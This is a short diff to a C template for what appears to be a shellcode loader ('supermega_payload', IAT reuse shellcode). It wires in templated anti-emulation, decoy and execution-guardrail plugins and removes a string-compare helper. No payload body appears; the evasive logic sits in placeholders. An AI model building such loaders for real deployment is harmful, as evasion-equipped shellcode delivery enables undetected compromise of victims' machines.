@@ -11,6 +11,11 @@ char *supermega_payload;
 
 {{plugin_antiemulation}}
 
+{{plugin_decoy}}
+
+{{plugin_executionguardrail}}
+
+
 /* iat_reuse_rx
 
    Standard IAT reuse shellcode
@@ -20,11 +25,18 @@ char *supermega_payload;
 
 int main()
 {
-	// Depends on plugin_antiemulation
+	DWORD result;
+
+	// Call: Execution Guardrail
+	if (executionguardrail() != 0) {
+		return 1;
+	}
+
+	// Call: Anti Emulation plugin
 	antiemulation();
 
-	// Decoy
-	{{plugin_decoy}}
+	// Call: Decoy plugin
+	decoy();
 
 	// Allocate 1
     // char *dest = ...
@@ -48,13 +60,3 @@ int main()
 	return 0;
 }
 
-int mystrcmp(wchar_t* str1, wchar_t* str2) {
-	int i = 0;
-	while (str1[i] != L'\0' && str2[i] != L'\0') {
-		if (str1[i] != str2[i]) {
-			return 1;
-		}
-		i++;
-	}
-	return 0;
-}
